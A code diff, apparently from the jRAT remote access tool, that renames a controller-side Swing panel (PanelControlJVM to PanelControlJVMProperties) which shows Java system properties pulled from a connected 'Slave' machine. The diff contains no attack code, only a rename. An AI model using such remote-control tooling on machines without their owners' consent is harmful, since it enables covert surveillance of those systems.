@@ -20,7 +20,7 @@ import pro.jrat.packets.outgoing.Packet61SystemJavaProperties;
 
 
 @SuppressWarnings("serial")
-public class PanelControlJVM extends PanelControlParent {
+public class PanelControlJVMProperties extends PanelControlParent {
 
 	private JTable table;
 	private DefaultTableModel model;
@@ -29,7 +29,7 @@ public class PanelControlJVM extends PanelControlParent {
 		return model;
 	}
 
-	public PanelControlJVM(Slave sl) {
+	public PanelControlJVMProperties(Slave sl) {
 		super(sl);
 		this.slave = sl;
 		JPanel panel = new JPanel();
@@ -42,7 +42,7 @@ public class PanelControlJVM extends PanelControlParent {
 		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
 
 		JButton btnReload = new JButton("Reload");
-		btnReload.setIcon(new ImageIcon(PanelControlJVM.class.getResource("/icons/update.png")));
+		btnReload.setIcon(new ImageIcon(PanelControlJVMProperties.class.getResource("/icons/update.png")));
 		btnReload.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				clear();
@@ -56,7 +56,7 @@ public class PanelControlJVM extends PanelControlParent {
 				clear();
 			}
 		});
-		btnClear.setIcon(new ImageIcon(PanelControlJVM.class.getResource("/icons/clear.png")));
+		btnClear.setIcon(new ImageIcon(PanelControlJVMProperties.class.getResource("/icons/clear.png")));
 		GroupLayout gl_panel = new GroupLayout(panel);
 		gl_panel.setHorizontalGroup(gl_panel.createParallelGroup(Alignment.TRAILING).addGroup(gl_panel.createSequentialGroup().addContainerGap().addGroup(gl_panel.createParallelGroup(Alignment.TRAILING).addComponent(scrollPane, Alignment.LEADING, GroupLayout.DEFAULT_SIZE, 545, Short.MAX_VALUE).addGroup(gl_panel.createSequentialGroup().addComponent(btnClear).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnReload))).addContainerGap()));
 		gl_panel.setVerticalGroup(gl_panel.createParallelGroup(Alignment.LEADING).addGroup(Alignment.TRAILING, gl_panel.createSequentialGroup().addContainerGap().addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 247, Short.MAX_VALUE).addPreferredGap(ComponentPlacement.UNRELATED).addGroup(gl_panel.createParallelGroup(Alignment.BASELINE).addComponent(btnReload).addComponent(btnClear)).addContainerGap()));
